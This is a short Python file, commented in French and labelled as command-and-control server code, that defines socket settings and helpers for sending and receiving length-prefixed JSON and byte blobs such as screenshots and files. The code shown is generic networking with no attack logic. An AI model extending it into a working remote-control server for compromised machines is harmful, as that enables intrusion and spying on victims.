#Code serveur C2
import socket
import json
import struct
import threading

ENCODING = "utf-8"
HOST = "0.0.0.0"
PORT = 8080

#Fonctions réseau

def send_msg(sock: socket.socket, payload: dict) -> None:
    """Pour envoyer un json"""
    data = json.dumps(payload).encode(ENCODING)
    sock.sendall(struct.pack(">I", len(data)) + data)

def send_bytes(sock: socket.socket, blob: bytes, meta: dict) -> None:
    """Pour envoyer des bytes (screenshot, fichier…)"""
    header = json.dumps(meta).encode(ENCODING)
    sock.sendall(struct.pack(">I", len(header)) + header)
    sock.sendall(struct.pack(">I", len(blob)) + blob)

def _receiveN(sock: socket.socket, n: int) -> bytes | None:
    """Lit exactement n octets"""
    buf = b""
    while len(buf) < n:
        chunk = sock.recv(n - len(buf))
        if not chunk:
            return None
        buf += chunk
    return buf

def receiveMessage(sock: socket.socket) -> dict:
    """Pour recevoir un json"""
    raw_len = _receiveN(sock, 4)
    if raw_len is None:
        raise ConnectionError("connexion coupée par le client")
    (msg_len,) = struct.unpack(">I", raw_len)
    data = _receiveN(sock, msg_len)
    if data is None:
        raise ConnectionError("connexion interrompue en cours de message")
    return json.loads(data.decode(ENCODING))
